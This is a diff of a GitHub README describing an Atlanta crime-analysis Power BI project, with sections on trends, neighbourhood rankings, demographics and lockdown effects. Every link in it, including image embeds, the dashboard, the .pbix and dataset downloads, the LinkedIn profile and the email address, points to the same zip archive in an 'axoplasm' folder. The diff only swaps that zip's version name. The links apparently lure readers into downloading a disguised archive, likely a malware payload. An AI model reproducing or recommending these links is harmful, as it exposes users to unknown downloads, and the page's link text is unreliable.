@@ -1,5 +1,5 @@
 # Atlanta Crime Analysis Power BI Project
-![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip%20PD%20Background%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip)
+![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip%20PD%20Background%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip)
 
 ## Introduction
 This project, developed as part of the **Analytics Extra Mentorship Program**, is a comprehensive analysis of crime trends in Atlanta from 2015 to 2020. It examines the impact of demographic factors, neighborhood population, and external influences like the COVID-19 lockdown on crime rates. The analysis was performed using Power BI and DAX to create interactive dashboards.
@@ -50,7 +50,7 @@ The project implemented a star schema with the following relationships:
   - Many-to-One between `Crime Table` and `Date`.
 
 > **Data Model:** The data model image below
-![Data Model](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip%20PD%20Data%20Model%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip)
+![Data Model](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip%20PD%20Data%20Model%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip)
 
 ---
 
@@ -60,38 +60,38 @@ The project implemented a star schema with the following relationships:
    - Analyzed crime trends over five years and forecasted the next 18 months.
    - Visualized significant drops in crime during the COVID-19 lockdown and gradual recovery post-lockdown.
    
-   ![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip%20Trend%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip)
+   ![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip%20Trend%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip)
 
 ### **2. Crime by Type**
    - Provided a breakdown of crime occurrences by type, highlighting the largest increases (e.g., homicide and aggravated assault).
 
-  ![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip%20By%20Type%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip)
+  ![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip%20By%20Type%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip)
      
 ### **3. Neighborhood Crime Rankings**
    - Ranked neighborhoods by crime rates (crimes/population).
    - Identified Downtown and Midtown as high-crime areas, while others like Regency Trace reported zero crime rates.
 
-  ![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip%20Crime%20Ranking%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip)
+  ![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip%20Crime%20Ranking%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip)
      
 ### **4. Geographic Crime Distribution**
    - Displayed crime occurrences on an interactive map with drilldowns from neighborhoods to specific locations.
 
-  ![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip%20Crime%20Distribution%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip)
+  ![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip%20Crime%20Distribution%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip)
 
 ### **5. Demographic Insights**
    - Explored crime rates across racial and ethnic groups, revealing disparities and highlighting areas for community-based intervention.
  
-  ![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip%20Insight%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip)
+  ![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip%20Insight%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip)
      
 ### **6. Population Impact**
    - Analyzed the correlation between population size and crime rates, identifying zones where smaller populations experienced higher crime densities due to other factors.
 
-  ![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip%20Impact%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip)
+  ![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip%20Impact%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip)
 
 ### **7. Lockdown Impact**
    - Evaluated crime rates during pre-lockdown, lockdown, and post-lockdown phases, illustrating significant reductions during restricted movement periods.
 
-  ![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip%20Impact%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip)
+  ![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip%20Impact%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip)
 
 ---
 
@@ -102,10 +102,10 @@ This project was published on my **Power BI Fabric workspace**, allowing for str
 - **Production Stage:** Final deployment and public sharing.
 
 ### Public Dashboard Access
-The interactive dashboard is accessible via this [Power BI Fabric link](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip). Stakeholders can explore crime trends, rankings, and demographic insights in real time.
+The interactive dashboard is accessible via this [Power BI Fabric link](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip). Stakeholders can explore crime trends, rankings, and demographic insights in real time.
 
 > **BI Fabric Deployment Pipeline:**
-![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip%20PD%20BI%20Fabric%20Deployment%20Pipeline%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip)
+![](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip%20PD%20BI%20Fabric%20Deployment%20Pipeline%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip)
 
 ---
 
@@ -127,13 +127,13 @@ Key findings from the analysis include:
 ---
 
 ## Repository Contents
-1. **Power BI File:** [Download the .pbix file](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip%20PD%20BI%20Crime%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip).
-2. **Dataset:** [Download the crime dataset](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip%20Crime%20Statistics%20Analysis%20with%20Power%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip).
+1. **Power BI File:** [Download the .pbix file](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip%20PD%20BI%20Crime%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip).
+2. **Dataset:** [Download the crime dataset](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip%20Crime%20Statistics%20Analysis%20with%20Power%https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip).
 3. **Screenshots:** All visuals included in this report.
-4. **Public Dashboard Link:** [Access the published dashboard here](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip).
+4. **Public Dashboard Link:** [Access the published dashboard here](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip).
 
 ---
 
 ## Contact
 Feel free to connect with me for further inquiries:
-- [LinkedIn Profile](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip) or email https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Power_B_Atlanta_P_Group_Project_v1.7-beta.1.zip
+- [LinkedIn Profile](https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip) or email https://github.com/Thomas-Nyanumba/Atlanta-PD-Power-BI-Group-Project/raw/refs/heads/main/axoplasm/Group_Atlanta_P_Power_Project_B_v3.5.zip
